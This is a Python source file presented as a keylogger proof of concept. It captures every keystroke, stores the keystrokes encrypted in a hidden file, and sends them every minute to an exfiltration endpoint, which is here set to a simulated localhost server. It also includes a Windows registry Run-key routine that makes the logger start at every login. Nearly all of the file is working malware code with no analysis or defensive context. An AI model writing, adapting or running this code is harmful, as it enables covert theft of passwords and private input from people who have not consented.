import os
import sys
import threading
import time
import base64
import datetime
import logging
import requests
from pynput import keyboard
from cryptography.fernet import Fernet

# Configuration
LOG_FILE_PATH = os.path.expanduser("~/.keylogger_poc.log")
ENCRYPTION_KEY_FILE = os.path.expanduser("~/.keylogger_poc.key")
EXFILTRATION_ENDPOINT = "http://localhost:5000/upload"  # Simulated remote server
KILL_SWITCH_COMBO = {keyboard.Key.ctrl_l, keyboard.Key.shift, keyboard.KeyCode(char='k')}

# Setup logging for debug/info
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)

class KeyLoggerPOC:
    def __init__(self):
        self.log_buffer = []
        self.pressed_keys = set()
        self.running = True
        self.lock = threading.Lock()

        # Load or create encryption key
        self.key = self.load_or_create_key()
        self.cipher = Fernet(self.key)
        
        # Start the exfiltration thread
        self.exfiltration_interval = 60  # seconds
        self.exfiltration_thread = threading.Thread(target=self.exfiltrate_periodically, daemon=True)
        self.exfiltration_thread.start()
        
    def load_or_create_key(self):
        if os.path.exists(ENCRYPTION_KEY_FILE):
            with open(ENCRYPTION_KEY_FILE, 'rb') as f:
                key = f.read()
            logging.info("Encryption key loaded from file.")
        else:
            key = Fernet.generate_key()
            with open(ENCRYPTION_KEY_FILE, 'wb') as f:
                f.write(key)
            logging.info("Encryption key generated and saved.")
        return key

    def encrypt(self, plaintext: str) -> str:
        token = self.cipher.encrypt(plaintext.encode('utf-8'))
        b64_token = base64.urlsafe_b64encode(token).decode('utf-8')
        return b64_token

    def decrypt(self, b64_token: str) -> str:
        token = base64.urlsafe_b64decode(b64_token)
        plaintext = self.cipher.decrypt(token).decode('utf-8')
        return plaintext

    def on_press(self, key):
        with self.lock:
            self.pressed_keys.add(key)
        # Kill switch detection
        if self.killswitch_triggered():
            logging.info("Kill switch triggered. Stopping keylogger.")
            self.running = False
            return False  # Stop listener

        # Record key
        key_str = self.format_key(key)
        timestamp = datetime.datetime.now().isoformat(timespec='seconds')
        log_entry = f"{timestamp} - {key_str}"
        self.log_buffer.append(log_entry)
        logging.debug(f"Key recorded: {log_entry}")

    def on_release(self, key):
        with self.lock:
            if key in self.pressed_keys:
                self.pressed_keys.remove(key)

    def killswitch_triggered(self) -> bool:
        # Detect if all keys in the combo are currently pressed
        with self.lock:
            return KILL_SWITCH_COMBO.issubset(self.pressed_keys)

    @staticmethod
    def format_key(key) -> str:
        if isinstance(key, keyboard.KeyCode):
            return key.char if key.char else f"[Unknown Char]"
        else:
            return f"[{key.name}]"

    def save_logs(self):
        if not self.log_buffer:
            return
        # Prepare text block
        data = "\n".join(self.log_buffer)
        encrypted_data = self.encrypt(data)
        with open(LOG_FILE_PATH, 'a') as f:
            f.write(encrypted_data + "\n")
        logging.info(f"Saved {len(self.log_buffer)} keystrokes to log file.")
        self.log_buffer.clear()

    def exfiltrate(self):
        # Read all stored logs
        if not os.path.exists(LOG_FILE_PATH):
            logging.debug("No log file to exfiltrate.")
            return
        try:
            with open(LOG_FILE_PATH, 'r') as f:
                encrypted_logs = f.read().strip().splitlines()
            if not encrypted_logs:
                logging.debug("Log file empty, nothing to exfiltrate.")
                return
            # Send logs one by one (simulate)
            for entry in encrypted_logs:
                payload = {'log': entry}
                try:
                    # Simulated POST request to localhost server
                    response = requests.post(EXFILTRATION_ENDPOINT, json=payload, timeout=5)
                    if response.status_code == 200:
                        logging.info("Exfiltrated one log entry successfully.")
                    else:
                        logging.warning(f"Failed to exfiltrate log: HTTP {response.status_code}")
                except requests.RequestException as e:
                    logging.warning(f"Exfiltration connection error: {e}")
                    # Stop trying further exfiltration this round
                    return
            # If all sent successfully, truncate log file
            with open(LOG_FILE_PATH, 'w') as f:
                f.truncate(0)
            logging.info("Exfiltration complete, log file cleared.")
        except Exception as e:
            logging.error(f"Error during exfiltration: {e}")

    def exfiltrate_periodically(self):
        while self.running:
            time.sleep(self.exfiltration_interval)
            if not self.running:
                break
            logging.debug("Attempting periodic exfiltration.")
            self.exfiltrate()

    def start(self):
        logging.info("Keylogger started. Press Ctrl+Shift+K to stop.")
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            while self.running:
                time.sleep(1)
                self.save_logs()
            listener.stop()
        # Final save on exit
        self.save_logs()
        logging.info("Keylogger terminated cleanly.")

def add_startup_persistence():
    """
    Notes for startup persistence:
    Windows: add registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run pointing to this script
    Unix (Linux/macOS): add .desktop file or cron job, or place script in ~/.config/autostart/
    This function requires admin rights and platform detection to implement fully.
    Here is an example for Windows registry (run this script with admin privileges):
    """
    if os.name == 'nt':
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
            script_path = os.path.abspath(sys.argv[0])
            winreg.SetValueEx(key, "KeyloggerPOC", 0, winreg.REG_SZ, f'python "{script_path}"')
            winreg.CloseKey(key)
            logging.info("Startup persistence added to Windows registry.")
        except Exception as e:
            logging.error(f"Failed to add startup persistence: {e}")
    else:
        logging.warning("Startup persistence for non-Windows OS must be set up manually.")

if __name__ == "__main__":
    # Uncomment the following line to add startup persistence if desired
    # add_startup_persistence()

    keylogger = KeyLoggerPOC()
    try:
        keylogger.start()
    except KeyboardInterrupt:
        logging.info("KeyboardInterrupt received. Exiting.")
        keylogger.running = False
        keylogger.save_logs()

